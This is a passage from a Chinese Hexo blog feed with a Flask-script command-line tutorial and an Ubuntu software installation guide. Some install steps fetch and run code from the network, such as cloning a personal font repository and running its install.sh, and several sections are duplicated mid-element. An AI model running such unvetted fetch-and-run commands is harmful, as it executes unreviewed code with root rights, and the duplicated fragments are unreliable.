punctuation">:</span>         <span class="token keyword">pass</span>@cli<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>         cli<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于上面的代码，可以直接执行<code>python manage.py hello</code> 从而执行<code>hello()</code> 方法中的代码</p></blockquote><h3 id="Flask-script"><a href="#Flask-script" class="headerlink" title="Flask-script"></a><code>Flask-script</code></h3><blockquote><p>它的作用是可以通过命令行的形式来操作<code>Flask</code>.比如通过一条命令设置数据库,定时任务等等.</p><p>安装</p><pre class="line-numbers language-bash">$ pip install flask-script</code></pre><p>需要新建一个<code>manager.py</code> 文件来操作.总的来说,可以通过两个装饰器实现</p><ul><li><code>manager.command</code></li><li><code>manager.option()</code></li></ul></blockquote><h4 id="创建并运行命令"><a href="#创建并运行命令" class="headerlink" title="创建并运行命令"></a>创建并运行命令</h4><blockquote><ol><li>创建一个<code>Python</code> 脚本文件,可以命名为<code>manager.py</code></li><li>在<code>manager.py</code> 中,必须有一个<code>Manager</code> 实例,<code>Manager</code>类追踪所有在命令行中调用的命令和处理过程的调用运行情况</li><li><code>Manager</code> 只需要一个参数-<code>Flask</code> 实例.</li><li>调用<code>manager.run()</code> 启动Manager实例接受命令行的命令</li></ol><p><code>manager.py</code></p><pre><code class="python"><code class="language-bash">$ pip install flask-script</code></pre><p>需要新建一个<code>manager.py</code> 文件来操作.总的来说,可以通过两个装饰器实现</p><ul><li><code>manager.command</code></li><li><code>manager.option()</code></li></ul></blockquote><h4 id="创建并运行命令"><a href="#创建并运行命令" class="headerlink" title="创建并运行命令"></a>创建并运行命令</h4><blockquote><ol><li>创建一个<code>Python</code> 脚本文件,可以命名为<code>manager.py</code></li><li>在<code>manager.py</code> 中,必须有一个<code>Manager</code> 实例,<code>Manager</code>类追踪所有在命令行中调用的命令和处理过程的调用运行情况</li><li><code>Manager</code> 只需要一个参数-<code>Flask</code> 实例.</li><li>调用<code>manager.run()</code> 启动Manager实例接受命令行的命令</li></ol><p><code>manager.py</code></p><pre><code class="python">"""treeproject├── manager.py├── app.py├── config.py├── static└── templates"""from flask_script import Managerfrom app import app# 绑定 Flask 实例manager= Manager(app)if __name__ == '__main__':    manager.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="使用-manager-command-装饰器"><a href="#使用-manager-command-装饰器" class="headerlink" title="使用@manager.command 装饰器"></a>使用<code>@manager.command</code> 装饰器</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token comment" spellcheck="true"># 绑定 Flask 实例</span>manager<span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用装饰器</span>@manager<span class="token punctuation">.</span>command<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令行执行</p><pre class="line-numbers language-bash"><code class="language-bash">$ python manager.py hellohello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="使用-manager-option-装饰器"><a href="#使用-manager-option-装饰器" class="headerlink" title="使用@manager.option() 装饰器"></a>使用<code>@manager.option()</code> 装饰器</h4><blockquote><p>如果是复杂的脚本命令,可以使用<code>option</code> 装饰器.</p><p>可以有多个<code>option</code> 选项参数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token comment" spellcheck="true"># 绑定 Flask 实例</span>manager<span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用装饰器</span>@manager<span class="token punctuation">.</span>command<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 传递多重参数</span><span class="token comment" spellcheck="true"># option</span><span class="token comment" spellcheck="true"># 第一个参数指定简写形式</span><span class="token comment" spellcheck="true"># 第二个参数指定 全称形式</span><span class="token comment" spellcheck="true"># dest 指定 add_user_info 中的位置参数 name</span><span class="token comment" spellcheck="true"># help 帮助信息</span><span class="token comment" spellcheck="true"># default 默认参数</span>@manager<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'-n'</span><span class="token punctuation">,</span><span class="token string">'--name'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'Your Name'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>None<span class="token punctuation">)</span>@manager<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span><span class="token string">'--url'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'Your web site'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_user_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name:{},url:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令行执行</p><pre class="line-numbers language-bash"><code class="language-bash">$ python manager.py add_user_info -n Jack -u www.xxx.comname:Jack,url:www.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="添加子命令"><a href="#添加子命令" class="headerlink" title="添加子命令"></a>添加子命令</h4><blockquote><p>现在的目录结构</p><pre class="line-numbers language-bash"><code class="language-bash">$ treeproject├── manager.py├── app.py├── config.py├── static└── templates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设在现在的基础上要添加新的子命令给<code>db_manager.py</code></p><pre class="line-numbers language-bash"><code class="language-bash">$ treeproject├── manager.py├── db_manager.py├── app.py├── config.py├── static└── templates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>db_manager.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token comment" spellcheck="true"># 子脚本不用绑定 app</span>db_manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span><span class="token punctuation">)</span>@db_manager<span class="token punctuation">.</span>command<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'database init'</span><span class="token punctuation">)</span>@db_manager<span class="token punctuation">.</span>command<span class="token keyword">def</span> <span class="token function">create_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'create database'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> db_manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>manager.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token comment" spellcheck="true"># 绑定 Flask 实例</span>manager<span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用装饰器</span>@manager<span class="token punctuation">.</span>command<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 传递多重参数</span><span class="token comment" spellcheck="true"># option</span><span class="token comment" spellcheck="true"># 第一个参数指定简写形式</span><span class="token comment" spellcheck="true"># 第二个参数指定 全称形式</span><span class="token comment" spellcheck="true"># dest 指定 add_user_info 中的位置参数 name</span><span class="token comment" spellcheck="true"># help 帮助信息</span><span class="token comment" spellcheck="true"># default 默认参数</span>@manager<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'-n'</span><span class="token punctuation">,</span><span class="token string">'--name'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'Your Name'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>None<span class="token punctuation">)</span>@manager<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span><span class="token string">'--url'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'Your web site'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_user_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name:{},url:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用子命令</span><span class="token comment" spellcheck="true"># 添加子命令</span><span class="token keyword">from</span> db_manager <span class="token keyword">import</span> db_manager<span class="token comment" spellcheck="true"># 第一个选项是别名</span>manager<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span><span class="token string">'db'</span><span class="token punctuation">,</span>db_manager<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>终端运行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> $ python manager.py db init    <span class="token comment" spellcheck="true"># 别名 函数名</span>database init<span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> $ python manager.py db create_dbcreate database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Click </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu软件推荐</title>
      <link href="/posts/64674.html"/>
      <url>/posts/64674.html</url>
      
        <content type="html"><![CDATA[<blockquote class="pullquote mindmap mindmap-lg"><ul><li>software<ul><li>思维导图<ul><li>百度脑图</li></ul></li><li>输入法<ul><li>搜狗拼音</li><li>百度输入法</li></ul></li><li>个人知识系统<ul><li>为知笔记</li><li>Vnote+坚果云</li></ul></li><li>mysql<ul><li>mysql workbench</li></ul></li><li>通讯工具<ul><li>QQ</li><li>飞鸽</li></ul></li><li>终端监控工具<ul><li>htop</li></ul></li><li>办公套件<ul><li>libreoffice</li><li>wps</li></ul></li><li>视频工具<ul><li>kazam 录屏</li><li>kdenlive 编辑</li></ul></li><li>gif工具<ul><li>peek</li></ul></li><li>截图工具<ul><li>deepin截图</li><li>shutter</li></ul></li><li>浏览器<ul><li>chrome</li></ul></li><li>图片工具<ul><li>gimp</li></ul></li><li>安装anaconda</li><li>安装剪切板<ul><li>clipman</li></ul></li><li>系统显示conky</li><li>FTP<ul><li>gftp</li></ul></li><li>温度<ul><li>psensor</li></ul></li></ul></li></ul></blockquote><h3 id="1-安装百度脑图离线版"><a href="#1-安装百度脑图离线版" class="headerlink" title="1.安装百度脑图离线版"></a>1.安装百度脑图离线版</h3><blockquote><p><code>github</code>地址:<code>https://github.com/NaoTu/DesktopNaotu</code>,目前最新版是3.2.3</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 解压安装包</span>$ unzip DesktopNaotu-linux-x64.zip $ <span class="token function">cd</span> DesktopNaotu-linux-x64/$ <span class="token function">chmod</span> +x  DesktopNaotu<span class="token comment" spellcheck="true"># 测试使用性</span>$./DesktopNaotu <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建桌面快捷方式:(图标也添加一下)</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> mousepad /usr/share/applications/naotu.desktop<span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span>Type <span class="token operator">=</span> ApplicationVersion <span class="token operator">=</span> 3.2.3Name <span class="token operator">=</span> naotuGenericName <span class="token operator">=</span> BaiduNaotuComment <span class="token operator">=</span> BaiduNaotuIcon<span class="token operator">=</span>/home/zning/icon/naotu.pngTerminal  <span class="token operator">=</span> <span class="token boolean">false</span>Exec <span class="token operator">=</span> /home/zning/software/DesktopNaotu-linux-x64/DesktopNaotu %F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建一个文件夹,用来存放脑图文件</p><pre class="line-numbers language-bash">$ mkdir NaotuFile</code></pre><p>将其添加到收藏夹</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10083.png" alt="10083"></p></blockquote><h3 id="2-安装输入法"><a href="#2-安装输入法" class="headerlink" title="2.安装输入法"></a>2.安装输入法</h3><blockquote><p>安装搜狗拼音输入法:</p><ul><li><p>网址:<code>https://pinyin.sogou.com/linux/</code></p></li><li><p>直接下载最新版本,要注意下面的版本支持到1910,而不是ubuntu20.04</p></li><li><pre><code class="bash"><code class="language-bash">$ mkdir NaotuFile</code></pre><p>将其添加到收藏夹</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10083.png" alt="10083"></p></blockquote><h3 id="2-安装输入法"><a href="#2-安装输入法" class="headerlink" title="2.安装输入法"></a>2.安装输入法</h3><blockquote><p>安装搜狗拼音输入法:</p><ul><li><p>网址:<code>https://pinyin.sogou.com/linux/</code></p></li><li><p>直接下载最新版本,要注意下面的版本支持到1910,而不是ubuntu20.04</p></li><li><pre><code class="bash">  # 安装  $ sudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb   # 强制安装依赖  $ sudo apt install -f  # 重启输入法 fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果重启输入法不生效,需要重启系统</p></li></ul><p>安装百度<code>linux</code>输入法</p><ul><li><p>网址:<code>https://srf.baidu.com/site/guanwang_linux/index.html</code></p></li><li><p>直接下载最新版本,要注意下面的版本支持到1910,而不是ubuntu20.04</p></li><li><pre class="line-numbers language-bash"><code class="language-bash">  $ <span class="token function">sudo</span> dpkg -i fcitx-baidupinyin.deb   $ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果重启输入法不生效,需要重启系统</p></li></ul></blockquote><h3 id="3-构造个人知识系统"><a href="#3-构造个人知识系统" class="headerlink" title="3.构造个人知识系统"></a>3.构造个人知识系统</h3><blockquote><p>使用为知笔记在线同步(需要会员)</p><p>使用<code>vnote+坚果云</code> 每月使用免费流量同步</p></blockquote><h4 id="1-安装为知笔记"><a href="#1-安装为知笔记" class="headerlink" title="1.安装为知笔记"></a>1.安装为知笔记</h4><blockquote><p>在这里使用的不是官网的客户端,使用的是个人做得一个<code>plus</code> 版,添加了一些<code>windows</code> 上才有的功能</p><p>地址:<a href="https://github.com/altairwei/WizNotePlus" target="_blank" rel="noopener">https://github.com/altairwei/WizNotePlus</a></p><p>直接下载最新的版本,并运行就可以了(后缀是<code>appimage</code>)</p></blockquote><h4 id="2-安装typora"><a href="#2-安装typora" class="headerlink" title="2.安装typora"></a>2.安装<code>typora</code></h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># or run:</span><span class="token comment" spellcheck="true"># sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE</span><span class="token function">wget</span> -qO - https://typora.io/linux/public-key.asc <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -<span class="token comment" spellcheck="true"># add Typora's repository</span><span class="token function">sudo</span> add-apt-repository <span class="token string">'deb https://typora.io/linux ./'</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token comment" spellcheck="true"># install typora</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> typora<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果同步下载不了,则需要手动下载.(或者在软件商店中下载)</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10084.png" alt="10084"></p></blockquote><h4 id="3-安装Vnote"><a href="#3-安装Vnote" class="headerlink" title="3.安装Vnote"></a>3.安装<code>Vnote</code></h4><blockquote><p>地址:<a href="https://github.com/tamlok/vnote" target="_blank" rel="noopener">https://github.com/tamlok/vnote</a></p><p>在根文件夹中创建一个<code>note</code>文件夹</p><pre class="line-numbers language-bash">$ mkdir mynote</code></pre><p>可以配置各种主题,这里主要配置编辑工具是<code>typora</code></p><ol><li><p>新建一个<code>.md</code>后缀的测试文件,并且右键选择其他打开方式,添加外部程序:</p><pre><code class="bash"><code class="language-bash">$ mkdir mynote</code></pre><p>可以配置各种主题,这里主要配置编辑工具是<code>typora</code></p><ol><li><p>新建一个<code>.md</code>后缀的测试文件,并且右键选择其他打开方式,添加外部程序:</p><pre><code class="bash"># 按照说明文档,添加扩展程序# 需要先找到Typora程序位置$ whereis typoratypora: /snap/bin/typora<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre><code># 添加[external_editors]typora=/snap/bin/typora \&quot;%0\&quot;```</code></pre><p><img src="/posts/picture/10085.png" alt="10085"></p><p><img src="/posts/picture/10086.png" alt="10086"></p><p><img src="/posts/picture/10087.png" alt="10087"></p><p>如果在系统中找不到<code>vnote</code> 的启动图标,可以自己创建一个桌面快捷方式</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">touch</span> /usr/share/applications/vnote.desktop$ <span class="token function">sudo</span> mousepad /usr/share/applications/vnote.desktop <span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span>Type<span class="token operator">=</span>ApplicationVersion<span class="token operator">=</span>2.7Name<span class="token operator">=</span>VNoteGenericName<span class="token operator">=</span>Markdown NoteComment<span class="token operator">=</span>Note-taking application <span class="token keyword">for</span> pleasant MarkdownIcon<span class="token operator">=</span>/home/zning/icon/vnote.pngTerminal<span class="token operator">=</span>falseExec<span class="token operator">=</span>/home/zning/software/VNote-2.7.2-x86_64.AppImage %F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-安装坚果云"><a href="#4-安装坚果云" class="headerlink" title="4.安装坚果云"></a>4.安装坚果云</h4><blockquote><p>如果你想同步你的<code>vnote</code>内的数据到不同的设备上,可以使用坚果云,在坚果云中只需要设置你的<code>vnote</code>根目录是要同步的目录即可.</p><p>地址:<code>https://www.jianguoyun.com/s/downloads</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10088.png" alt="10088"></p></blockquote><h3 id="5-安装workbench"><a href="#5-安装workbench" class="headerlink" title="5.安装workbench"></a>5.安装<code>workbench</code></h3><blockquote><p>官网:<code>https://dev.mysql.com/downloads/workbench/</code></p><p>安装:</p><pre class="line-numbers language-bash">dpkg -i workbench</code></pre><p>连接:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10097.png" alt="10097"></p><p>点击加号按钮,输入服务器的<code>ip</code>用户名和密码即可.</p></blockquote><h3 id="6-通讯工具"><a href="#6-通讯工具" class="headerlink" title="6.通讯工具"></a>6.通讯工具</h3><blockquote><p>腾讯QQ,局域网工具可以使用飞鸽传书.</p><p><code>QQ for linux</code>:<code>https://im.qq.com/linuxqq/index.html</code></p><pre><code class="bash">$ dpkg -i install qq*</code></pre><p>飞鸽传书:<code>http://www.ipmsg.org.cn/</code></p><pre><code class="bash"><code class="language-bash">dpkg -i workbench</code></pre><p>连接:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10097.png" alt="10097"></p><p>点击加号按钮,输入服务器的<code>ip</code>用户名和密码即可.</p></blockquote><h3 id="6-通讯工具"><a href="#6-通讯工具" class="headerlink" title="6.通讯工具"></a>6.通讯工具</h3><blockquote><p>腾讯QQ,局域网工具可以使用飞鸽传书.</p><p><code>QQ for linux</code>:<code>https://im.qq.com/linuxqq/index.html</code></p><pre><code class="bash">$ dpkg -i install qq*</code></pre><p>飞鸽传书:<code>http://www.ipmsg.org.cn/</code></p><pre><code class="bash">$ tar zxvf Feige*# 直接运行$ ./QIpmsg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="7-安装终端监控工具"><a href="#7-安装终端监控工具" class="headerlink" title="7.安装终端监控工具"></a>7.安装终端监控工具</h3><blockquote><pre class="line-numbers language-bash">$ sudo apt install htop</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/100106.png" alt="100106"></p></blockquote><h3 id="8-安装办公套件"><a href="#8-安装办公套件" class="headerlink" title="8.安装办公套件"></a>8.安装办公套件</h3><blockquote><p>可以使用系统字典的<code>libreoffice</code></p><p>可以安装使用<code>wps</code>:<code>https://www.wps.cn/product/wpslinux</code>.直接下载适用于自己电脑的版本,这里下载64位的deb包.</p><p>安装:</p><pre><code class="bash">$ sudo dpkg -i wps-office_11.1.0.9615_amd64.deb</code></pre><p>安装缺失字体:</p><pre><code class="bash"><code class="language-bash">$ sudo apt install htop</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/100106.png" alt="100106"></p></blockquote><h3 id="8-安装办公套件"><a href="#8-安装办公套件" class="headerlink" title="8.安装办公套件"></a>8.安装办公套件</h3><blockquote><p>可以使用系统字典的<code>libreoffice</code></p><p>可以安装使用<code>wps</code>:<code>https://www.wps.cn/product/wpslinux</code>.直接下载适用于自己电脑的版本,这里下载64位的deb包.</p><p>安装:</p><pre><code class="bash">$ sudo dpkg -i wps-office_11.1.0.9615_amd64.deb</code></pre><p>安装缺失字体:</p><pre><code class="bash">$ sudo apt install git$ sudo git clone https://github.com/jiaxiaochu/font.git && cd font && ./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我这里已经下载.</p></blockquote><hr><blockquote><p>视频3件套</p><p>1.录屏:<code>kazam</code></p><p>2.编辑:<code>kdenlive\shotcut</code></p><p>3.观看:<code>vlc\mpv</code></p></blockquote><h3 id="9-安装录屏工具kazam"><a href="#9-安装录屏工具kazam" class="headerlink" title="9.安装录屏工具kazam"></a>9.安装录屏工具<code>kazam</code></h3><blockquote><pre class="line-numbers language-bash">sudo apt install kazam</code></pre></blockquote><h3 id="10-安装kdenlive"><a href="#10-安装kdenlive" class="headerlink" title="10.安装kdenlive"></a>10.安装<code>kdenlive</code></h3><blockquote><pre><code class="bash">sudo apt install kdenlive</code></pre><p>有一定的学习成本,请在真实机器上安装,最好是有<code>N</code> 卡的机器上安装.</p></blockquote><h3 id="11-安装shotcut"><a href="#11-安装shotcut" class="headerlink" title="11.安装shotcut"></a>11.安装<code>shotcut</code></h3><blockquote><pre><code class="bash">sudo snap install shotcut --classic</code></pre></blockquote><h3 id="12-安装播放器"><a href="#12-安装播放器" class="headerlink" title="12.安装播放器"></a>12.安装播放器</h3><blockquote><p><code>mpv</code></p><pre><code class="bash"><code class="language-bash">sudo apt install kazam</code></pre></blockquote><h3 id="10-安装kdenlive"><a href="#10-安装kdenlive" class="headerlink" title="10.安装kdenlive"></a>10.安装<code>kdenlive</code></h3><blockquote><pre><code class="bash">sudo apt install kdenlive</code></pre><p>有一定的学习成本,请在真实机器上安装,最好是有<code>N</code> 卡的机器上安装.</p></blockquote><h3 id="11-安装shotcut"><a href="#11-安装shotcut" class="headerlink" title="11.安装shotcut"></a>11.安装<code>shotcut</code></h3><blockquote><pre><code class="bash">sudo snap install shotcut --classic</code></pre></blockquote><h3 id="12-安装播放器"><a href="#12-安装播放器" class="headerlink" title="12.安装播放器"></a>12.安装播放器</h3><blockquote><p><code>mpv</code></p><pre><code class="bash">$ sudo add-apt-repository ppa:mc3man/mpv-tests$ sudo apt install mpv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>vlc</code></p><p>应用商店安装</p></blockquote><h3 id="13-安装gif-开源工具peek"><a href="#13-安装gif-开源工具peek" class="headerlink" title="13.安装gif 开源工具peek"></a>13.安装<code>gif</code> 开源工具<code>peek</code></h3><blockquote><p>还可以录制<code>mp4</code>格式的视频</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:peek-developers/stable<span class="token function">sudo</span> apt update<span class="token function">sudo</span> apt <span class="token function">install</span> peek<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="14-安装截图工具"><a href="#14-安装截图工具" class="headerlink" title="14.安装截图工具"></a>14.安装截图工具</h3><h4 id="1-deepin截图"><a href="#1-deepin截图" class="headerlink" title="1.deepin截图"></a>1.<code>deepin</code>截图</h4><blockquote><p><strong>针对Ubuntu18.04版本</strong></p><p><code>深度截图</code>对系统有所要求,截止到新安装的系统18.04版本,系统自己所带的软件中新就可以直接安装</p></blockquote><blockquote><p><img src="/posts/../My_Note/Ubuntu/Pictures/img_2.png" alt="img_2"></p><p>在xubuntu中设置出发快捷键.</p><p>1.找到系统的<code>键盘</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/img_3.png" alt="img_3"></p><p>2.点击添加,然后点击打开</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/img_4.png" alt="img_4"></p><p>3.找到<code>/usr/bin/deepin</code>截图工具,点击确定后在设置自己想要的快捷键就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/img_5.png" alt="img_5"></p></blockquote><h4 id="2-hotshots"><a href="#2-hotshots" class="headerlink" title="2.hotshots"></a>2.<code>hotshots</code></h4><blockquote><p>安装可以完全按照主页上的说明进行安装</p><p>1.加载安装源</p><pre class="line-numbers 